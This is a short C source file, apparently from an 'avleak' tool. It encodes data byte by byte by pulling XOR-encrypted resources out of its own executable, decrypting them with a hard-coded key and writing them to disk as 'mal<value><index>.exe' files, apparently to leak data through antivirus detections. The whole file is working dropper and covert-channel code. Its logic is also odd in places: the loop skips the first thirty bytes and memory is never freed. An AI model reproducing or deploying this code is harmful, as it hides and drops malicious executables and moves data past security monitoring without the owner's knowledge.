#include "avleak.h"

#define minLength 30
#define maxLength 60
void leak(unsigned char* data, int length) {
	if (maxLength < length) {
		length = maxLength;
	}
	
	for(int i = minLength; i < length; ++i){
        drop(data[i], i);
	}
}


void drop(const unsigned char c, int i)
{
	// Recover the resource
	HRSRC hRsrc;
	TCHAR cAsciiVal[30];
	char fileName[20];
	unsigned char key[32] = { 0x8f, 0x3b, 0x73, 0xd7, 0x50, 0xc8, 0x40, 0x18, 0x57, 0x2c, 0x9b, 0xa7, 0xc3, 0x52, 0xb8, 0x04, 0x05, 0x8d, 0x06, 0x69, 0x97, 0x51, 0x02, 0x79, 0xe5, 0x37, 0x22, 0xba, 0xae, 0xa1, 0x46, 0x9a };
	
	sprintf(fileName, "\\mal%d%d.exe",c, i);
	
	char *path = malloc(MAX_PATH * sizeof(char));
    sprintf(cAsciiVal, "IDR_BINARY%d", c);
	hRsrc = FindResourceA(NULL, cAsciiVal, RT_RCDATA);

	if (hRsrc != NULL) {
		// Load it in memory
		HGLOBAL hGlob;
		if (hGlob = LoadResource(NULL, hRsrc))
		{
			// Find the size of the desired resource
			DWORD dwResSize = SizeofResource(NULL, hRsrc);
			GetCurrentDirectoryA(MAX_PATH, path);
            strcat(path, fileName);

			// Create file handling
			HANDLE hFileWrite = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if (hFileWrite != INVALID_HANDLE_VALUE)
			{
				DWORD dwSizeWritten = 0;
				// Write to file
				char* decryptedData = malloc(dwResSize * sizeof(char));
				char* encryptedData = LockResource(hGlob);
				for (size_t i = 0; i < dwResSize; ++i) {
					decryptedData[i] = encryptedData[i] ^ key[i % 32];					
				}
				WriteFile(hFileWrite, decryptedData, dwResSize, &dwSizeWritten, NULL);
				CloseHandle(hFileWrite);
			}
		}		
	}
}

void endLeak(){
	leak("\x00\x00", 2);
}